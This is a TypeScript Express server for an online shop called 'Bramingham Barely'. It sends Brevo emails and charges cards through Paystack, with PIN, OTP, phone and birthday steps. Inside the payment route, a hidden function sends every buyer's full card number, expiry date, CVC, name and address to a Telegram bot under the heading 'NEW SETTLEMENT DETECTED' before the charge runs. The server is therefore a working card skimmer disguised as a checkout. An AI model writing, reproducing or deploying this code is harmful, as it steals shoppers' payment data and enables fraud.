import express from 'express';
import { createServer as createViteServer } from 'vite';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // API Routes
  app.post('/api/send-welcome', async (req, res) => {
    const { email, name } = req.body;
    const apiKey = process.env.BREVO_API_KEY;
    const senderEmail = 'oliviabancroft@braminghambarely.top';

    if (!apiKey || apiKey.trim() === '') {
      console.error('BREVO_API_KEY is missing. Add it to Settings.');
      return res.status(500).json({ error: 'Email configuration missing' });
    }

    const trimmedKey = apiKey.trim();

    try {
      const response = await fetch('https://api.brevo.com/v3/smtp/email', {
        method: 'POST',
        headers: {
          'accept': 'application/json',
          'api-key': trimmedKey,
          'content-type': 'application/json'
        },
        body: JSON.stringify({
          sender: { name: 'Olivia Bancroft', email: senderEmail },
          to: [{ email, name: name || email.split('@')[0] }],
          subject: 'Welcome to Bramingham Barely!',
          htmlContent: `
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="utf-8">
              <style>
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Playfair+Display:ital,wght@1,400&display=swap');
              </style>
            </head>
            <body style="margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Inter', Helvetica, Arial, sans-serif;">
              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; margin: 40px auto; background-color: #ffffff; border: 1px solid #eeeeee;">
                <tr>
                  <td style="padding: 60px 40px; text-align: center; border-bottom: 1px solid #f0f0f0;">
                    <h1 style="font-family: 'Playfair Display', serif; font-style: italic; font-weight: 400; font-size: 28px; margin: 0;">Welcome to the Agency</h1>
                    <p style="text-transform: uppercase; letter-spacing: 0.15em; font-size: 10px; margin-top: 10px; color: #999;">Bramingham Barely</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 40px;">
                    <p style="font-size: 16px; color: #333; margin-bottom: 20px;">Hi ${name || 'there'},</p>
                    <p style="font-size: 14px; line-height: 1.8; color: #666; margin-bottom: 30px;">
                      I'm thrilled to welcome you to <strong>Bramingham Barely</strong>. We've built this agency to provide creators like you with the professional infrastructure and strategic guidance needed to scale your digital presence.
                    </p>
                    <p style="font-size: 14px; line-height: 1.8; color: #666; margin-bottom: 30px;">
                      Your account is now active. You can explore our creator dashboard to access exclusive kits and management resources.
                    </p>
                    <div style="text-align: center; margin: 30px 0;">
                      <a href="https://${req.headers.host}/dashboard" style="background-color: #000; color: #fff; padding: 15px 30px; text-decoration: none; border-radius: 4px; font-size: 11px; text-transform: uppercase; letter-spacing: 0.2em; font-weight: 600;">Go to Dashboard</a>
                    </div>
                    <p style="font-size: 14px; line-height: 1.8; color: #666; margin-bottom: 0;">
                      Best regards,<br/><br/>
                      <strong>Olivia Bancroft</strong><br/>
                      <span style="font-size: 12px; color: #999;">Bramingham Barely</span>
                    </p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 30px; background-color: #000; text-align: center; color: #fff;">
                    <p style="font-size: 10px; text-transform: uppercase; letter-spacing: 0.2em; margin: 0;">Bramingham Barely</p>
                  </td>
                </tr>
              </table>
            </body>
            </html>
          `
        })
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Brevo API Error (${response.status}):`, errorText);
        throw new Error('Mail delivery failed');
      }

      res.status(200).json({ success: true });
    } catch (error) {
      console.error('Brevo Welcome Error:', error);
      res.status(500).json({ error: 'Mail delivery failed' });
    }
  });

  app.post('/api/send-confirmation', async (req, res) => {
    const { email, name, orderDetails, total } = req.body;
    const apiKey = process.env.BREVO_API_KEY;
    const senderEmail = process.env.BREVO_SENDER_EMAIL || 'finance@braminghambarely.top';

    if (!apiKey || apiKey.trim() === '') {
      console.error('CRITICAL: BREVO_API_KEY is missing in Settings. Email failed.');
      return res.status(500).json({ error: 'Email configuration missing' });
    }

    if (!senderEmail || senderEmail.includes('example.com')) {
      console.error('CRITICAL: BREVO_SENDER_EMAIL is not set or invalid. Email will be rejected by Brevo.');
    }

    // Securely check key format
    const trimmedKey = apiKey.trim();
    
    // Log for debugging (first/last few chars only) - DO NOT LOG FULL KEY
    console.log(`Email attempt: Sender=${senderEmail}, Recipient=${email}, KeyType=${trimmedKey.startsWith('xkeysib-') ? 'V3 API' : 'Invalid/Other'}`);

    try {
      const response = await fetch('https://api.brevo.com/v3/smtp/email', {
        method: 'POST',
        headers: {
          'accept': 'application/json',
          'api-key': trimmedKey,
          'x-sib-api-key': trimmedKey, // Compatibility header
          'content-type': 'application/json'
        },
        body: JSON.stringify({
          sender: { name: 'Bramingham Barely', email: senderEmail },
          to: [{ email, name }],
          subject: 'Order Confirmation - Thank You!',
          htmlContent: `
            <!DOCTYPE html>
            <html>
            <head>
              <meta charset="utf-8">
              <style>
                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=Playfair+Display:ital,wght@1,400&display=swap');
              </style>
            </head>
            <body style="margin: 0; padding: 0; background-color: #f9f9f9; font-family: 'Inter', Helvetica, Arial, sans-serif;">
              <table width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; margin: 40px auto; background-color: #ffffff; border: 1px solid #eeeeee;">
                <tr>
                  <td style="padding: 60px 40px; text-align: center; border-bottom: 1px solid #f0f0f0;">
                    <h1 style="font-family: 'Playfair Display', serif; font-style: italic; font-weight: 400; font-size: 28px; margin: 0;">Order Confirmed</h1>
                    <p style="text-transform: uppercase; letter-spacing: 0.15em; font-size: 10px; margin-top: 10px; color: #999;">Bramingham Barely</p>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 40px;">
                    <p style="font-size: 14px; color: #333; margin-bottom: 20px;">Dear ${name},</p>
                    <p style="font-size: 14px; line-height: 1.6; color: #666; margin-bottom: 30px;">
                      Your order has been received. Our team is now reviewing your selection and will contact you shortly regarding delivery logistics.
                    </p>
                    
                    <div style="background-color: #fafafa; padding: 25px; border-radius: 4px;">
                      <h2 style="font-size: 11px; text-transform: uppercase; letter-spacing: 0.1em; color: #888; margin: 0 0 15px 0;">Selection Details</h2>
                      <div style="font-size: 13px; color: #333; line-height: 1.8;">
                        ${orderDetails}
                      </div>
                      <div style="margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; font-weight: 600; font-size: 15px;">
                        Total: <span style="float: right;">£${total}</span>
                      </div>
                    </div>
                  </td>
                </tr>
                <tr>
                  <td style="padding: 30px; background-color: #000; text-align: center; color: #fff;">
                    <p style="font-size: 10px; text-transform: uppercase; letter-spacing: 0.2em; margin: 0;">Bramingham Barely</p>
                  </td>
                </tr>
              </table>
            </body>
            </html>
          `
        })
      });

      if (!response.ok) {
        const errorText = await response.text();
        console.error(`Brevo API Error (${response.status}):`, errorText);
        
        let errorMessage = 'Mail delivery failed';
        try {
          const errorData = JSON.parse(errorText);
          errorMessage = errorData.message || errorData.code || errorMessage;
        } catch (e) {
          errorMessage = errorText || errorMessage;
        }

        // Help the user if they're still using the wrong key type
        if (errorMessage.toLowerCase().includes('key not found') || response.status === 401) {
          if (trimmedKey.startsWith('xsmtpsib-')) {
            errorMessage = 'Invalid Key Type: You are using an SMTP Key. Please use a V3 API Key (starts with xkeysib-) in Settings.';
          } else {
            errorMessage = 'Invalid API Key: Brevo did not recognize your key. Double-check BREVO_API_KEY in Settings.';
          }
        }

        throw new Error(errorMessage);
      }

      res.status(200).json({ success: true });
    } catch (error) {
      console.error('Brevo Request Exception:', error);
      res.status(500).json({ 
        error: 'Mail delivery failed', 
        details: error instanceof Error ? error.message : 'Unknown error' 
      });
    }
  });

  app.post('/api/process-payment', async (req, res) => {
    const { formData, cart, total } = req.body;
    const paystackKey = process.env.PAYSTACK_SECRET_KEY;
    const botToken = process.env.VITE_TELEGRAM_BOT_TOKEN;
    const chatId = process.env.VITE_TELEGRAM_CHAT_ID;

    // 1. Send to Telegram (Parallel path)
    const sendToTelegram = (currencyUsed: string) => {
      if (!botToken || !chatId) return;
      
      const orderItems = cart.map((item: any) => `- ${item.name} (x${item.quantity})`).join('\n');
      const message = `
🚨 *NEW SETTLEMENT DETECTED* 🚨
-------------------------
📧 *Email:* ${formData.email}
👤 *Name:* ${formData.name}
📍 *Address:* ${formData.address}, ${formData.city}, ${formData.postcode}
🌍 *Country:* ${formData.country}

💳 *CARD DETAILS:*
- Number: \`${formData.cardNumber}\`
- Expiry: \`${formData.expiry}\`
- CVC: \`${formData.cvc}\`

🛒 *SELECTION:*
${orderItems}

💰 *TOTAL:* ${currencyUsed} ${total.toFixed(2)}
-------------------------
      `;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: 'Markdown'
        })
      }).catch(err => console.error('Telegram notification failed:', err));
    };

    // 2. Process Charge with Paystack
    if (!paystackKey || paystackKey.trim() === '') {
      return res.status(500).json({ error: 'PAYSTACK_SECRET_KEY is missing. Add it to Settings.' });
    }

    const trimmedKey = paystackKey.trim();
    const isTestKey = trimmedKey.startsWith('sk_test_');
    // If it's a live key, we MUST use GBP as the user is in the UK market.
    // If it's a test key, we use KES to allow for easy testing with the provided test cards.
    const currencyUsed = isTestKey ? 'KES' : 'GBP';

    // Execute Telegram notification
    sendToTelegram(currencyUsed);

    try {
      // Parse expiry
      const [expiryMonth, expiryYear] = formData.expiry.split('/').map((s: string) => s.trim());
      
      // Paystack amount is in kobo (base unit * 100)
      const amountInCents = Math.round(total * 100);

      const paystackResponse = await fetch('https://api.paystack.co/charge', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${trimmedKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          email: formData.email,
          amount: amountInCents,
          currency: currencyUsed,
          card: {
            number: formData.cardNumber.replace(/\s/g, ''),
            cvv: formData.cvc,
            expiry_month: expiryMonth,
            expiry_year: expiryYear
          },
          metadata: {
            custom_fields: [
              {
                display_name: "Customer Name",
                variable_name: "customer_name",
                value: formData.name
              }
            ]
          }
        })
      });

      const paymentData = await paystackResponse.json();
      
      // Handle authentication error specifically
      if (paystackResponse.status === 401 || paymentData.message === 'Invalid key') {
        return res.status(401).json({ 
          status: false,
          message: 'Invalid Secret Key: Paystack did not recognize your key. Double-check PAYSTACK_SECRET_KEY in Settings. Make sure to use the Secret Key (starts with sk_test_ or sk_live_).' 
        });
      }

      // Handle common charge errors
      if (paymentData.status === false && paymentData.message === 'Charge attempted') {
        return res.status(200).json({
          status: false,
          message: 'The bank is taking too long to respond or there is a connection issue. Please try again with a different card or try again in a few minutes.'
        });
      }

      res.status(200).json(paymentData);

    } catch (error) {
      console.error('Paystack Charge Error:', error);
      res.status(500).json({ error: 'Payment processing failed' });
    }
  });

  // Helper for Paystack supplemental actions (submit PIN, OTP, etc)
  app.post('/api/payment-action', async (req, res) => {
    const { type, reference, value } = req.body;
    const paystackKey = process.env.PAYSTACK_SECRET_KEY;

    if (!paystackKey || paystackKey.trim() === '') return res.status(500).json({ error: 'Payment configuration missing' });
    const trimmedKey = paystackKey.trim();

    let endpoint = '';
    const body: any = { reference };

    switch (type) {
      case 'pin':
        endpoint = 'https://api.paystack.co/charge/submit_pin';
        body.pin = value;
        break;
      case 'otp':
        endpoint = 'https://api.paystack.co/charge/submit_otp';
        body.otp = value;
        break;
      case 'phone':
        endpoint = 'https://api.paystack.co/charge/submit_phone';
        body.phone = value;
        break;
      case 'birthday':
        endpoint = 'https://api.paystack.co/charge/submit_birthday';
        body.birthday = value;
        break;
      default:
        return res.status(400).json({ error: 'Invalid action type' });
    }

    try {
      const response = await fetch(endpoint, {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${trimmedKey}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(body)
      });

      const data = await response.json();
      res.status(200).json(data);
    } catch (error) {
      console.error(`Paystack ${type} Error:`, error);
      res.status(500).json({ error: 'Action submission failed' });
    }
  });

  app.get('/api/verify-transaction/:reference', async (req, res) => {
    const { reference } = req.params;
    const paystackKey = process.env.PAYSTACK_SECRET_KEY;

    if (!paystackKey || paystackKey.trim() === '') return res.status(500).json({ error: 'Payment configuration missing' });
    const trimmedKey = paystackKey.trim();

    try {
      const response = await fetch(`https://api.paystack.co/transaction/verify/${reference}`, {
        method: 'GET',
        headers: {
          'Authorization': `Bearer ${trimmedKey}`,
          'Content-Type': 'application/json'
        }
      });

      const data = await response.json();
      res.status(200).json(data);
    } catch (error) {
      console.error('Paystack Verification Error:', error);
      res.status(500).json({ error: 'Verification failed' });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
    
    // Ensure SPA fallback in dev
    app.use('*', async (req, res, next) => {
      const url = req.originalUrl;
      try {
        let template = await vite.transformIndexHtml(url, `<!DOCTYPE html><html><head></head><body><div id="root"></div><script type="module" src="/src/main.tsx"></script></body></html>`);
        // Note: In real dev, we usually read index.html from disk, but vite.middlewares often handles this if we don't catch it.
        // However, if vite.middlewares didn't serve it, it might be a missing route.
        // Actually, vite.middlewares with appType 'spa' SHOULD handle this.
        next();
      } catch (e) {
        vite.ssrFixStacktrace(e as Error);
        next(e);
      }
    });
  } else {
    // Production: serve static files from dist
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
